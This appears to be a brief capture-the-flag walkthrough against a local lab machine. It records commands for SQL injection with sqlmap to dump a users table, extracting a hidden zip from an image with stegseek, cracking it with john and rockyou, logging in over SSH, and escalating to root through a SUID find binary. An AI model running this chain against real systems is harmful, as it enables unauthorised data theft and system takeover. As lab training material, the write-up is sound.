# Initial Scans
* There are two ports open, 22 and 80
* After basic web app enum, we see that there is a login page, and that it is vulnerable to SQL injection. We can record the POST request and pass the request.txt file to SQLmap
```
sqlmap -vv -r auth-request.txt --dbs
sqlmap -vv -r auth-request.txt -D users --tables
sqlmap -vv -r auth-request.txt -D users -T usuarios --dump
```
* There is an entry in the users tabled named
```
directoriotravieso
```
* Which is Spanish for naughtydirectory
* So let's check out this endpoint
```
/directoriotravieso
```
# Initial Access
* There's a jpg image in here, so we download it
* Let's check to see if there's anything supsicious about this image
```
stegseek miramebien.jpg
```
* We output a file that was originally a zip file
```
mv miramebien.jpg.out ocultito.zip
zip2john ocultito.zip > ocultito.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ocultito.hash
```
* Then inside the zip file are credentials
```
ssh carlos@172.17.0.2
```
# Privilege Escalation
* We check the system for SUID binaries
```
find / -perm -4000 2>/dev/null
```
* There is a SUID binary for the Find binary
```
find . -exec /bin/bash -p \; -quit
```
We are root
